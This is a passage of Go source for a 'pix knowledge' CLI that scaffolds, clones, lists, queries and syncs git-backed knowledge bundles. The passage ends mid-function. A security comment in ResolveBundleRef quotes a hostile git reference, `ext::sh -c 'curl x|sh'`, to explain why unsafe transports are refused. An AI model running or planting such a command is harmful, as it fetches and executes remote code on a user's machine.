package knowledge

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"pix/host/cli"
	"pix/host/config"
	"pix/host/hostenv"
	"pix/host/rpc"
	"pix/host/sys"
	"pix/host/workspace"
)

// EnsureServiceUp and PropagateServiceConfig are INJECTED, not imported.
//
// Both mean "make the daemon reflect this change", which is composition: it
// needs the service capability AND this one, so it belongs to whoever composes
// them. Importing service here would make knowledge a capability calling a
// sibling, which arch_test.go rejects — and rightly, because that is the edge
// that turned the old package into a web.
//
// cmd/pix wires them at startup. They default to no-ops so a test exercising
// knowledge alone does not have to fake a daemon.
var (
	EnsureServiceUp        = func() {}
	PropagateServiceConfig = func(io.Writer) {}
)

// Run is the `knowledge` verb tree: `init`, `use`, `ls`. It scaffolds
// and wires the GLOBAL OKF knowledge bundle the knowledge service (:11436)
// indexes, so nobody hand-edits config.toml or hand-authors an OKF skeleton.
//
//	pix knowledge init [DIR]     scaffold a spec-correct OKF bundle (default
//	                                  <config-dir>/knowledge), git init it, and
//	                                  wire it into config (services += knowledge,
//	                                  knowledge_bundles += DIR). Idempotent.
//	pix knowledge use <path|url> point the global KB at an existing bundle: a
//	                                  local path indexed in place, a git URL
//	                                  cloned/pulled to <config-dir>/knowledge-cache.
//	pix knowledge use --project <path|url> [--dir D]
//	                                  write .pix/knowledge in the repo (D or
//	                                  cwd) so recall scopes to it in that workspace.
//	                                  Does NOT touch global config.
//	pix knowledge ls             list configured bundles + daemon health.
func Run(argv []string) {
	if len(argv) == 0 {
		fmt.Fprint(os.Stderr, Usage)
		os.Exit(2)
	}
	if argv[0] == "-h" || argv[0] == "--help" {
		fmt.Print(Usage)
		return
	}
	switch argv[0] {
	case "init":
		RunKnowledgeInit(argv[1:])
	case "use":
		runKnowledgeUse(argv[1:])
	case "ls":
		runKnowledgeLs(argv[1:])
	case "query", "search":
		runKnowledgeQuery(argv[1:])
	case "sync", "push":
		runKnowledgeSync(argv[1:])
	case "remote":
		runKnowledgeRemote(argv[1:])
	default:
		fmt.Fprintf(os.Stderr, "pix knowledge: unknown subcommand %q (want: init, use, ls, query, sync, remote)\n", argv[0])
		os.Exit(2)
	}
}

// runKnowledgeQuery searches the knowledge daemon (:11436) from the host so you
// can debug empty recall without launching a sandbox. It scopes the query to the
// ACTIVE PROFILE's bundles (the daemon indexes the union of all profiles), so a
// personal query never returns work concepts.
func runKnowledgeQuery(argv []string) {
	fs := cli.NewFlagSet()
	fs.EnableJSON()
	limit := fs.Int("limit", 5, "n")
	positional, perr := fs.Parse(argv)
	if perr != nil {
		cli.ExitFromErr("knowledge query", perr)
	}
	if fs.Help {
		fmt.Println("usage: pix knowledge query <text...> [--limit N] [--json]")
		return
	}
	q := strings.TrimSpace(strings.Join(positional, " "))
	if q == "" {
		fmt.Fprintln(os.Stderr, "usage: pix knowledge query <text...> [--limit N] [--json]")
		os.Exit(2)
	}
	cfg, _, cerr := workspace.LoadResolvedConfig()
	if cerr != nil {
		fmt.Fprintf(os.Stderr, "pix knowledge query: %v\n", cerr)
		os.Exit(1)
	}
	params := map[string]any{"query": q, "limit": *limit}
	// Send the profile's canonical bundle ids so recall is scoped. An empty set
	// (no bundles configured) omits the filter, preserving the "all bundles"
	// back-compat contract for a raw single-context host.
	if ids := canonicalBundleIDs(cfg.KnowledgeBundles); len(ids) > 0 {
		params["bundles"] = ids
	}
	// Lazy auto-start: spin up the knowledge daemon detached if it is down (only
	// when the knowledge service is actually enabled; best-effort — a failure
	// falls through to the existing rpc.ErrServiceDown degrade below).
	EnsureServiceUp()
	res, err := rpc.KnowledgeClient().Call("query", params)
	if err != nil {
		cli.ExitFromErr("knowledge query", err)
	}
	concepts := rpc.AsList(res["concepts"])
	if fs.Json {
		_ = cli.WriteJSONOut(os.Stdout, map[string]any{"concepts": concepts})
		return
	}
	if len(concepts) == 0 {
		fmt.Println("(no matches)")
		return
	}
	for _, c := range concepts {
		score := ""
		if s, ok := c["score"].(float64); ok {
			score = fmt.Sprintf("  [%.2f]", s)
		}
		fmt.Printf("%s  %s%s\n", rpc.Str(c, "id"), rpc.Str(c, "title"), score)
	}
}

// runKnowledgeRemote shows or sets the git remote of the knowledge bundle, so a
// fresh `knowledge init` bundle (git init, no remote) can be pointed at a repo
// for backup/sync without cd-ing into it.
//
//	pix knowledge remote [--bundle DIR]              show origin
//	pix knowledge remote set <url> [--bundle DIR]    set origin
func runKnowledgeRemote(argv []string) {
	fs := cli.NewFlagSet()
	bundleFlag := fs.Str("bundle", "")
	positional, perr := fs.Parse(argv)
	if perr != nil {
		fmt.Fprintln(os.Stderr, perr.Error())
		os.Exit(2)
	}
	if fs.Help {
		fmt.Println("usage: pix knowledge remote [set <url>] [--bundle DIR]")
		return
	}
	bundle, err := resolveSyncBundle(*bundleFlag)
	if err != nil {
		fmt.Fprintf(os.Stderr, "pix knowledge remote: %v\n", err)
		os.Exit(1)
	}
	if len(positional) == 0 {
		url, err := gitRemoteURL(bundle)
		if err != nil || strings.TrimSpace(url) == "" {
			fmt.Printf("%s: no origin remote — set one with `pix knowledge remote set <url>`\n", bundle)
			return
		}
		fmt.Printf("%s -> %s\n", bundle, redactURL(url))
		return
	}
	if positional[0] != "set" || len(positional) != 2 {
		fmt.Fprintln(os.Stderr, "usage: pix knowledge remote set <url> [--bundle DIR]")
		os.Exit(2)
	}
	if err := gitSetRemote(bundle, positional[1]); err != nil {
		fmt.Fprintf(os.Stderr, "pix knowledge remote set: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("%s origin -> %s\n", bundle, redactURL(positional[1]))
}

// runKnowledgeSync commits and pushes the knowledge bundle from anywhere, so you
// never have to cd to ~/.config/pix/knowledge to `git push`. Safe by
// default: it pushes to a `knowledge/sync-<ts>` BRANCH and prints a PR hint (the
// same gated, review-first model as the `enrich` skill). It NEVER blindly pushes
// main — that requires --allow-main.
//
//	pix knowledge sync [-m MSG] [--bundle DIR] [--allow-main]
func runKnowledgeSync(argv []string) {
	fs := cli.NewFlagSet()
	msg := fs.Str("message", "", "m")
	bundleFlag := fs.Str("bundle", "")
	allowMain := fs.Bool("allow-main")
	positional, perr := fs.Parse(argv)
	if perr != nil {
		fmt.Fprintln(os.Stderr, perr.Error())
		os.Exit(2)
	}
	if fs.Help {
		fmt.Println("usage: pix knowledge sync [-m MSG] [--bundle DIR] [--allow-main]")
		return
	}
	if len(positional) > 0 {
		fmt.Fprintln(os.Stderr, "usage: pix knowledge sync [-m MSG] [--bundle DIR] [--allow-main]")
		os.Exit(2)
	}
	if err := knowledgeSync(*bundleFlag, *msg, *allowMain, os.Stdout); err != nil {
		fmt.Fprintf(os.Stderr, "pix knowledge sync: %v\n", err)
		os.Exit(1)
	}
}

// knowledgeSync is the testable core of `knowledge sync`.
func knowledgeSync(bundleFlag, msg string, allowMain bool, out io.Writer) error {
	bundle, err := resolveSyncBundle(bundleFlag)
	if err != nil {
		return err
	}
	if !isGitRepo(bundle) {
		return fmt.Errorf("%s is not a git repo — run `pix knowledge init` or `git init` there first", bundle)
	}
	if _, rerr := gitRemoteURL(bundle); rerr != nil {
		return fmt.Errorf("%s has no origin remote — set one with `pix knowledge remote set <url>`", bundle)
	}
	if strings.TrimSpace(msg) == "" {
		msg = "knowledge: sync " + timeStamp()
	}
	dirty, err := gitIsDirty(bundle)
	if err != nil {
		return err
	}

	// --allow-main: commit + push the CURRENT branch (but refuse a detached HEAD,
	// which would push the literal ref "HEAD").
	if allowMain {
		branch, berr := gitCurrentBranch(bundle)
		if berr != nil {
			return berr
		}
		if branch == "HEAD" {
			return fmt.Errorf("detached HEAD in %s — checkout a branch before --allow-main", bundle)
		}
		if dirty {
			if err := gitAddCommit(bundle, msg); err != nil {
				return fmt.Errorf("committing: %w", err)
			}
			fmt.Fprintf(out, "committed changes in %s\n", bundle)
		}
		if err := gitPushBranch(bundle, branch); err != nil {
			return fmt.Errorf("pushing %s: %w", branch, err)
		}
		fmt.Fprintf(out, "pushed %s to origin\n", branch)
		return nil
	}

	// Default (safe): create the review branch FIRST so the current branch tip is
	// never advanced, THEN commit onto it and push. A commit made before the
	// branch existed would land on (and dirty) main — the exact footgun to avoid.
	branch := "knowledge/sync-" + timeStamp() + "-" + shortRand()
	if err := gitCheckoutBranch(bundle, branch); err != nil {
		return fmt.Errorf("creating branch %s: %w", branch, err)
	}
	if dirty {
		if err := gitAddCommit(bundle, msg); err != nil {
			return fmt.Errorf("committing: %w", err)
		}
		fmt.Fprintf(out, "committed changes on %s\n", branch)
	} else {
		fmt.Fprintf(out, "working tree clean — pushing existing commits on %s\n", branch)
	}
	if err := gitPushBranch(bundle, branch); err != nil {
		return fmt.Errorf("pushing %s: %w", branch, err)
	}
	fmt.Fprintf(out, "pushed branch %s to origin\n", branch)
	fmt.Fprintln(out, "open a PR to review + merge:")
	fmt.Fprintf(out, "    (cd %s && gh pr create --fill)\n", bundle)
	fmt.Fprintln(out, "or push straight to your default branch with: pix knowledge sync --allow-main")
	return nil
}

// resolveSyncBundle picks the bundle dir for sync/remote: the --bundle flag if
// given, else the single configured bundle, else an error listing candidates.
func resolveSyncBundle(bundleFlag string) (string, error) {
	if strings.TrimSpace(bundleFlag) != "" {
		abs, err := filepath.Abs(bundleFlag)
		if err != nil {
			return "", err
		}
		return abs, nil
	}
	// Fall back to the configured bundle(s) (profiles were removed; there is a
	// single knowledge_bundles list).
	cfg, _, err := workspace.LoadResolvedConfig()
	if err != nil {
		return "", err
	}
	switch len(cfg.KnowledgeBundles) {
	case 0:
		return "", fmt.Errorf("no knowledge bundle configured — run `pix knowledge init`")
	case 1:
		return cfg.KnowledgeBundles[0], nil
	default:
		return "", fmt.Errorf("multiple bundles configured — pick one with --bundle:\n  %s", strings.Join(cfg.KnowledgeBundles, "\n  "))
	}
}

// DefaultKnowledgeDir is <config-dir>/knowledge — the sibling of config.toml,
// resolved the same way config.Path() resolves its directory.
func DefaultKnowledgeDir() string {
	return filepath.Join(filepath.Dir(config.Path()), "knowledge")
}

// KnowledgeCacheDir is <config-dir>/knowledge-cache — where git-URL bundles are
// cloned/pulled so the resolved local path is what gets indexed and scoped.
func KnowledgeCacheDir() string {
	return filepath.Join(filepath.Dir(config.Path()), "knowledge-cache")
}

// RunKnowledgeInit is the CLI entry point for `knowledge init [DIR]`.
func RunKnowledgeInit(argv []string) {
	dir, help, err := ResolveInitArgs(argv)
	if help {
		fmt.Print(InitUsage)
		return
	}
	if err != nil {
		// A flag typo must NOT scaffold a junk bundle or mutate config: bail with a
		// usage error BEFORE any filesystem / config side effect.
		fmt.Fprintf(os.Stderr, "pix knowledge init: %v\n\n%s", err, InitUsage)
		os.Exit(2)
	}
	cfg, err := config.Load()
	if err != nil {
		fmt.Fprintf(os.Stderr, "pix knowledge init: loading config: %v\n", err)
		os.Exit(1)
	}
	if err := Init(cfg, dir, os.Stdout); err != nil {
		fmt.Fprintf(os.Stderr, "pix knowledge init: %v\n", err)
		os.Exit(1)
	}
	// knowledge_bundles (+ services) is daemon-affecting: propagate exactly like
	// `config set knowledge_bundles` does, so a running daemon indexes the new
	// bundle with no manual restart (L1 — keeps the docs' "daemon-affecting
	// writes auto-restart" claim true on this path too).
	knowledgePropagate(os.Stdout)
}

// knowledgePropagate is the config-propagation hook `knowledge init`/`use` run
// after saving a daemon-affecting change. A package-var seam (like
// hostBinaryResolver) so tests can observe/neutralize it without launchctl/
// systemctl probes.
var knowledgePropagate = func(out io.Writer) { PropagateServiceConfig(out) }

// ResolveInitArgs validates `knowledge init` argv WITHOUT side effects
// so a flag typo can be rejected before any scaffold / git-init / config write.
// It returns help=true for a -h/--help request, an error for any leading-dash
// token (mirroring `knowledge use`), else the resolved target dir.
func ResolveInitArgs(argv []string) (dir string, help bool, err error) {
	if cli.WantsHelp(argv) {
		return "", true, nil
	}
	dir = DefaultKnowledgeDir()
	// Validate EVERY token, not just argv[0]: `knowledge init ./kb --jsom` must
	// reject the trailing flag typo rather than scaffold ./kb + mutate config. Any
	// dash-prefixed token is an unknown flag; more than one positional is an error
	// (init takes a single optional DIR).
	var positionals []string
	for _, a := range argv {
		if a == "" {
			continue
		}
		if strings.HasPrefix(a, "-") {
			return "", false, fmt.Errorf("unknown flag %q (knowledge init takes an optional DIR)", a)
		}
		positionals = append(positionals, a)
	}
	if len(positionals) > 1 {
		return "", false, fmt.Errorf("only one DIR allowed, got %d (%s)", len(positionals), strings.Join(positionals, " "))
	}
	if len(positionals) == 1 {
		abs, aerr := filepath.Abs(positionals[0])
		if aerr != nil {
			return "", false, aerr
		}
		dir = abs
	}
	return dir, false, nil
}

// Init scaffolds a spec-correct OKF bundle at dir (idempotent: it never
// clobbers an existing bundle, only fills in missing files), git-inits it when
// new, then wires it into cfg (knowledge_bundles += dir, services += knowledge)
// and Save()s. Testable: takes cfg + out and returns an error instead of exiting.
func Init(cfg *config.Config, dir string, out io.Writer) error {
	existed := isOKFBundle(dir)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return fmt.Errorf("creating %s: %w", dir, err)
	}

	// git init a fresh bundle so it is version-controllable from the start.
	// Best-effort: a missing git is a warning, not a failure — the scaffold +
	// config wiring are still useful without it.
	if !isGitRepo(dir) {
		if _, err := exec.LookPath("git"); err != nil {
			fmt.Fprintf(out, "note: git not found on PATH — skipping git init (install git to version this bundle)\n")
		} else if err := gitInit(dir); err != nil {
			fmt.Fprintf(out, "note: git init failed (%v) — bundle scaffolded but not version-controlled\n", err)
		}
	}

	if existed {
		fmt.Fprintf(out, "Bundle already present at %s — not clobbering, re-wiring config.\n", dir)
	} else if err := scaffoldBundle(dir); err != nil {
		return err
	} else {
		fmt.Fprintf(out, "Scaffolded OKF bundle at %s\n", dir)
	}

	wireKnowledge(cfg, dir)
	if err := cfg.Save(); err != nil {
		return fmt.Errorf("saving config: %w", err)
	}
	fmt.Fprintf(out, "Wired into %s (knowledge_bundles += %s, services += knowledge)\n", config.Path(), dir)
	fmt.Fprintln(out, "The knowledge service (:11436) indexes it at startup; recall queries hit it.")
	return nil
}

// runKnowledgeUse is the CLI entry point for `knowledge use <path|url>` and
// `knowledge use --project <path|url> [--dir D]`. The bare form points the GLOBAL
// KB at a bundle; --project writes a per-repo .pix/knowledge pointer instead
// and leaves global config untouched.
func runKnowledgeUse(argv []string) {
	if cli.WantsHelp(argv) {
		fmt.Println("usage: pix knowledge use <path|git-url>")
		fmt.Println("       pix knowledge use --project <path|git-url> [--dir D]")
		return
	}
	project := false
	dir := "."
	ref := ""
	for i := 0; i < len(argv); i++ {
		a := argv[i]
		switch {
		case a == "--project":
			project = true
		case a == "--dir":
			if i+1 >= len(argv) {
				fmt.Fprintln(os.Stderr, "pix knowledge use: --dir needs a value")
				os.Exit(2)
			}
			i++
			dir = argv[i]
		case strings.HasPrefix(a, "--dir="):
			dir = a[len("--dir="):]
		case strings.HasPrefix(a, "-"):
			fmt.Fprintf(os.Stderr, "pix knowledge use: unknown flag %q\n", a)
			os.Exit(2)
		default:
			if ref != "" {
				fmt.Fprintln(os.Stderr, "pix knowledge use: only one <path|git-url> allowed")
				os.Exit(2)
			}
			ref = a
		}
	}
	if strings.TrimSpace(ref) == "" {
		fmt.Fprintln(os.Stderr, "usage: pix knowledge use <path|git-url>")
		fmt.Fprintln(os.Stderr, "       pix knowledge use --project <path|git-url> [--dir D]")
		os.Exit(2)
	}
	if project {
		if err := KnowledgeUseProject(ref, dir, os.Stdout); err != nil {
			fmt.Fprintf(os.Stderr, "pix knowledge use --project: %v\n", err)
			os.Exit(1)
		}
		return
	}
	cfg, err := config.Load()
	if err != nil {
		fmt.Fprintf(os.Stderr, "pix knowledge use: loading config: %v\n", err)
		os.Exit(1)
	}
	if err := Use(cfg, ref, os.Stdout); err != nil {
		fmt.Fprintf(os.Stderr, "pix knowledge use: %v\n", err)
		os.Exit(1)
	}
	// Daemon-affecting save → propagate (see RunKnowledgeInit).
	knowledgePropagate(os.Stdout)
}

// KnowledgeUseProject writes the per-project knowledge pointer
// <dir>/.pix/knowledge, resolving ref to a bundle path first (a local path
// to its absolute form, a git URL cloned/pulled into the cache — same resolver
// the global `use` uses). It does NOT touch global config: the pointer is meant
// to be committed to the repo so the project's knowledge travels with it. The
// launcher's `run` wiring reads this pointer and scopes recall to
// {global, this-project}.
func KnowledgeUseProject(ref, dir string, out io.Writer) error {
	// Resolve to clone/pull + validate the bundle, but the resolved cache path is
	// HOST-LOCAL (e.g. ~/.config/pix/knowledge-cache/...) and MUST NOT be
	// written into the committed pointer: a teammate who clones the repo would get
	// a dead path and silently empty recall. Write the PORTABLE ref instead — the
	// original git URL, or a repo-relative (else absolute) local path. run.go's
	// projectBundle re-resolves whichever form back to a canonical id at read time.
	if _, err := ResolveBundleRef(ref, KnowledgeCacheDir(), out); err != nil {
		return err
	}
	if strings.TrimSpace(dir) == "" {
		dir = "."
	}
	portable := portablePointerRef(ref, dir)
	pointer := filepath.Join(dir, ".pix", "knowledge")
	// Symlink-safe: the target repo may be an untrusted clone shipping
	// .pix (or .pix/knowledge) as a tracked symlink.
	if err := workspace.WriteStateFile(dir, "knowledge", []byte(portable+"\n"), 0o644); err != nil {
		return fmt.Errorf("writing %s: %w", pointer, err)
	}
	fmt.Fprintf(out, "Wrote project knowledge pointer %s -> %s\n", pointer, portable)
	fmt.Fprintln(out, "Commit .pix/knowledge to share this project's bundle; recall picks it up on the next `pix run`.")
	fmt.Fprintln(out, "Gitignore .pix/knowledge.scope (it is launcher-generated per run).")
	return nil
}

// portablePointerRef derives the PORTABLE reference to write into the committed
// .pix/knowledge pointer. A git URL is written verbatim (it travels with
// the repo). A local path is written repo-relative when it lives under dir (so a
// clone on another machine resolves it against the workspace), else as an
// absolute local path. run.go's projectBundle re-resolves whichever form back to
// a canonical bundle id.
func portablePointerRef(ref, dir string) string {
	ref = strings.TrimSpace(ref)
	if IsGitURL(ref) {
		return ref
	}
	absBundle, err := filepath.Abs(ref)
	if err != nil {
		return ref
	}
	absDir, err := filepath.Abs(dir)
	if err != nil {
		return absBundle
	}
	rel, err := filepath.Rel(absDir, absBundle)
	if err == nil && rel != ".." && !strings.HasPrefix(rel, ".."+string(filepath.Separator)) && !filepath.IsAbs(rel) {
		return rel
	}
	return absBundle
}

// Use points the global KB at an existing bundle: a local path is used
// in place; a git URL is cloned (or pulled if already cached) into
// <config-dir>/knowledge-cache/<repo>. Either way the resolved local path is
// added to knowledge_bundles and the knowledge service is enabled.
func Use(cfg *config.Config, ref string, out io.Writer) error {
	resolved, err := ResolveBundleRef(ref, KnowledgeCacheDir(), out)
	if err != nil {
		return err
	}
	wireKnowledge(cfg, resolved)
	if err := cfg.Save(); err != nil {
		return fmt.Errorf("saving config: %w", err)
	}
	fmt.Fprintf(out, "Using bundle %s\n", resolved)
	fmt.Fprintf(out, "Wired into %s (knowledge_bundles = %v, services += knowledge)\n", config.Path(), cfg.KnowledgeBundles)
	fmt.Fprintln(out, "The knowledge service (:11436) indexes it at startup; recall queries hit it.")
	return nil
}

// ResolveBundleRef turns a bundle reference into an absolute local path. A local
// path resolves to its absolute form; a git URL is cloned into a
// collision-free cache dir (cacheDirForURL) or pulled if already present.
// Cloning requires git — its absence is a clear error on this path (unlike init,
// where git is optional).
func ResolveBundleRef(ref, cacheDir string, out io.Writer) (string, error) {
	ref = strings.TrimSpace(ref)
	if !IsGitURL(ref) {
		abs, err := filepath.Abs(ref)
		if err != nil {
			return "", fmt.Errorf("resolving %s: %w", ref, err)
		}
		return abs, nil
	}
	// SECURITY: gate every git resolution through the SAME safeGitURL guard
	// clonePack uses. IsGitURL is a loose CLASSIFIER (anything ending ".git"
	// qualifies), so without this gate a reference like
	// `ext::sh -c 'curl x|sh' %G.git` would be handed to `git clone`, whose
	// ext::/fd:: transport helpers execute arbitrary commands. This hardens
	// both `knowledge use` and pack [[knowledge]] shared refs.
	if !cli.SafeGitURL(ref) {
		return "", fmt.Errorf("refusing unsafe git URL %q (only https/ssh/git remotes; no ext::/file:: transports or local-as-remote)", redactURL(ref))
	}
	if _, err := exec.LookPath("git"); err != nil {
		return "", fmt.Errorf("git not found on PATH — needed to clone %s; install git", ref)
	}
	dest := cacheDirForURL(cacheDir, ref)
	if isGitRepo(dest) {
		// Guard against ever pulling the WRONG repo into a cache dir. FAIL CLOSED:
		// only pull when we can positively confirm the cached checkout's `origin`
		// matches the requested URL. If origin is missing, unreadable, or different,
		// refuse to pull (it may track some other remote) and tell the user to
		// remove the cache dir to re-clone.
		got, err := gitRemoteURL(dest)
		if err != nil || got == "" || !sameGitURL(got, ref) {
			return "", fmt.Errorf("cache dir %s does not positively match %s (origin=%q, err=%v) — refusing to pull (remove %s to re-clone)", dest, ref, got, err, dest)
		}
		fmt.Fprintf(out, "Updating cached bundle %s\n", dest)
		if err := gitPull(dest); err != nil {
			return "", fmt.Errorf("pulling %s: %w", dest, err)
		}
		return dest, nil
	}
	if err := os.MkdirAll(cacheDir, 0o755); err != nil {
		return "", fmt.Errorf("creating cache dir %s: %w", cacheDir, err)
	}
	fmt.Fprintf(out, "Cloning %s into %s\n", ref, dest)
	if err := gitClone(ref, dest); err != nil {
		return "", fmt.Errorf("cloning %s: %w", ref, err)
	}
	return dest, nil
}

// runKnowledgeLs is the CLI entry point for `knowledge ls [--json]`.
func runKnowledgeLs(argv []string) {
	fs := cli.NewFlagSet()
	fs.EnableJSON()
	positional, err := fs.Parse(argv)
	if err != nil {
		cli.ExitFromErr("knowledge ls", err)
	}
	if fs.Help {
		fmt.Print(Usage)
		return
	}
	if len(positional) > 0 {
		fmt.Fprintf(os.Stderr, "pix knowledge ls: unexpected argument %q\nusage: pix knowledge ls [--json]\n", positional[0])
		os.Exit(2)
	}
	cfg, _, err := workspace.LoadResolvedConfig()
	if err != nil {
		fmt.Fprintf(os.Stderr, "pix knowledge ls: %v\n", err)
		os.Exit(1)
	}
	if fs.Json {
		_ = cli.WriteJSONOut(os.Stdout, knowledgeLsView(cfg, hostenv.Env{System: sys.Real{}}))
		return
	}
	knowledgeLs(cfg, hostenv.Env{System: sys.Real{}}, os.Stdout)
}

// knowledgeLsView is the machine-readable snapshot behind `knowledge ls --json`:
// the configured bundles, whether the knowledge service is enabled + reachable,
// and any project pointer in the cwd.
type knowledgeLsSnapshot struct {
	ConfigPath     string   `json:"config_path"`
	Bundles        []string `json:"knowledge_bundles"`
	ServiceEnabled bool     `json:"service_enabled"`
	ServiceUp      bool     `json:"service_up"`
	ProjectPointer string   `json:"project_pointer,omitempty"`
}

func knowledgeLsView(cfg *config.Config, env hostenv.Env) knowledgeLsSnapshot {
	v := knowledgeLsSnapshot{ConfigPath: config.Path(), Bundles: cfg.KnowledgeBundles}
	for _, s := range cfg.Services {
		if s == "knowledge" {
			v.ServiceEnabled = true
			break
		}
	}
	if v.ServiceEnabled {
		v.ServiceUp = env.DialLocal(11436)
	}
	v.ProjectPointer = ReadProjectPointer(".")
	return v
}

// knowledgeLs prints the configured knowledge bundles and whether the knowledge
// service is reachable on :11436. It degrades cleanly when the daemon is down.
func knowledgeLs(cfg *config.Config, env hostenv.Env, out io.Writer) {
	fmt.Fprintf(out, "# config: %s\n", config.Path())
	if len(cfg.KnowledgeBundles) == 0 {
		fmt.Fprintln(out, "knowledge_bundles: (none) — run `pix knowledge init` to create one")
	} else {
		fmt.Fprintln(out, "knowledge_bundles:")
		for _, b := range cfg.KnowledgeBundles {
			fmt.Fprintf(out, "  - %s\n", b)
		}
	}
	enabled := false
	for _, s := range cfg.Services {
		if s == "knowledge" {
			enabled = true
			break
		}
	}
	if !enabled {
		fmt.Fprintln(out, "service: disabled — enable with `pix config set services knowledge`")
	} else if env.DialLocal(11436) {
		fmt.Fprintln(out, "service: up (:11436)")
	} else {
		fmt.Fprintln(out, "service: down (:11436 unreachable) — start it with `pix serve`")
	}
	if ptr := ReadProjectPointer("."); ptr != "" {
		fmt.Fprintf(out, "project pointer: .pix/knowledge -> %s\n", ptr)
	}
}

// wireKnowledge adds the bundle dir to knowledge_bundles and ensures the
// knowledge service is enabled. Both are idempotent.
func wireKnowledge(cfg *config.Config, dir string) {
	cfg.AddKnowledgeBundle(dir)
	cfg.AddService("knowledge")
}

// CanonicalizeKnowledgeBundle normalizes a bundle path to the SAME id the
// knowledge store keys its `bundle` column on (host knowledge.go's
// canonicalizeBundle, design risk #1): absolute + symlink-free + cleaned, with a
// cleaned-absolute fallback when the path does not exist. Every writer (the
// store at reindex, this launcher's lazy reindex + scope-file writer) MUST agree
// byte-for-byte or `WHERE bundle IN (…)` matches nothing and recall goes silently
// empty. Replicated here (not imported) because the launcher is a separate
// dependency-light package.
func CanonicalizeKnowledgeBundle(path string) string {
	if path == "" {
		return ""
	}
	abs, err := filepath.Abs(path)
	if err != nil {
		abs = path
	}
	if resolved, rerr := filepath.EvalSymlinks(abs); rerr == nil {
		return resolved
	}
	return filepath.Clean(abs)
}

// ReadProjectPointer returns the raw (unresolved) first meaningful line of
// <dir>/.pix/knowledge — a local path or git URL — or "" when the pointer is
// absent/empty. Blank lines and #-comments are skipped so a hand-authored
// pointer stays readable.
func ReadProjectPointer(dir string) string {
	b, err := os.ReadFile(filepath.Join(dir, ".pix", "knowledge"))
	if err != nil {
		return ""
	}
	return firstNonEmptyLine(string(b))
}

// firstNonEmptyLine returns the first trimmed, non-comment, non-blank line of s.
func firstNonEmptyLine(s string) string {
	for _, ln := range strings.Split(s, "\n") {
		ln = strings.TrimSpace(ln)
		if ln != "" && !strings.HasPrefix(ln, "#") {
			return ln
		}
	}
	return ""
}

// IsGitURL reports whether ref should be treated as a git URL (cloneable) rather
// than a local path. Pure and side-effect free so it is unit-testable without
// touching the network or disk.
func IsGitURL(ref string) bool {
	ref = strings.TrimSpace(ref)
	switch {
	case strings.HasPrefix(ref, "http://"),
		strings.HasPrefix(ref, "https://"),
		strings.HasPrefix(ref, "git://"),
		strings.HasPrefix(ref, "ssh://"),
		strings.HasPrefix(ref, "git@"):
		return true
	case strings.HasSuffix(ref, ".git"):
		return true
	}
	return false
}

// cacheDirForURL derives a collision-free cache directory for a git URL under
// cacheDir. Two URLs that share a final repo name (github.com/acme/kb.git vs
// github.com/other/kb.git) MUST map to DISTINCT dirs, so the name embeds an
// org-repo readable prefix PLUS a short hash of the FULL url.
func cacheDirForURL(cacheDir, url string) string {
	return filepath.Join(cacheDir, cacheSlug(url))
}

// cacheSlug is the pure deriver behind cacheDirForURL: "<org>-<repo>-<shorthash>"
// where the hash of the full URL guarantees uniqueness even when org/repo
// collide after sanitizing.
func cacheSlug(url string) string {
	u := strings.TrimSpace(url)
	sum := sha256.Sum256([]byte(u))
	short := hex.EncodeToString(sum[:])[:8]
	return orgRepoSlug(u) + "-" + short
}

// orgRepoSlug returns a readable "<org>-<repo>" slug from a git URL's last two
// path segments (falling back to just the repo, or "bundle"). Purely cosmetic —
// cacheSlug appends a hash of the full URL to guarantee uniqueness.
func orgRepoSlug(url string) string {
	s := strings.TrimSpace(url)
	s = strings.TrimSuffix(s, "/")
	s = strings.TrimSuffix(s, ".git")
	s = strings.ReplaceAll(s, ":", "/") // normalize scp-like git@host:org/repo
	var segs []string
	for _, p := range strings.Split(s, "/") {
		if p != "" {
			segs = append(segs, p)
		}
	}
	if len(segs) == 0 {
		return "bundle"
	}
	if len(segs) >= 2 {
		return sanitizeSlug(segs[len(segs)-2]) + "-" + sanitizeSlug(segs[len(segs)-1])
	}
	return sanitizeSlug(segs[len(segs)-1])
}

// sanitizeSlug keeps only filesystem-safe characters for a cache dir component.
func sanitizeSlug(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-', r == '_', r == '.':
			b.WriteRune(r)
		default:
			b.WriteRune('-')
		}
	}
	out := b.String()
	if out == "" {
		return "bundle"
	}
	return out
}

// sameGitURL reports whether two git URLs refer to the same repo, ignoring a
// trailing slash and a ".git" suffix.
func sameGitURL(a, b string) bool {
	norm := func(s string) string {
		s = strings.TrimSpace(s)
		s = strings.TrimSuffix(s, "/")
		s = strings.TrimSuffix(s, ".git")
		return s
	}
	return norm(a) == norm(b)
}

// repoSlug derives a filesystem-safe cache dir name from a git URL: the last
// path segment with any trailing ".git" and separators stripped.
func repoSlug(url string) string {
	s := strings.TrimSpace(url)
	s = strings.TrimSuffix(s, "/")
	s = strings.TrimSuffix(s, ".git")
	if i := strings.LastIndexAny(s, "/:"); i >= 0 {
		s = s[i+1:]
	}
	if s == "" {
		return "bundle"
	}
	return s
}

// isOKFBundle reports whether dir already looks like an OKF bundle (has a
// root index.md), so init knows not to clobber it.
func isOKFBundle(dir string) bool {
	fi, err := os.Stat(filepath.Join(dir, "index.md"))
	return err == nil && !fi.IsDir()
}

// isGitRepo reports whether dir is inside a git work tree. It uses git's own
// check so a linked worktree (whose .git is a FILE, not a dir) is recognized.
func isGitRepo(dir string) bool {
	out, err := exec.Command("git", "-C", dir, "rev-parse", "--is-inside-work-tree").Output()
	return err == nil && strings.TrimSpace(string(out)) == "true"
}

func gitInit(dir string) error {
	return exec.Command("git", "-C", dir, "init", "-q").Run()
}

// gitRun runs a git subcommand and, on failure, returns an error carrying the
// combined stdout+stderr so auth/non-fast-forward messages aren't swallowed.
func gitRun(dir string, args ...string) error {
	out, err := exec.Command("git", append([]string{"-C", dir}, args...)...).CombinedOutput()
	if err != nil {
		msg := strings.TrimSpace(string(out))
		if msg == "" {
			return err
		}
		return fmt.Errorf("%s", msg)
	}
	return nil
}

// canonicalBundleIDs canonicalizes a list of bundle paths to the ids the
// knowledge store keys on (so a query filter matches).
func canonicalBundleIDs(paths []string) []string {
	var out []string
	for _, p := range paths {
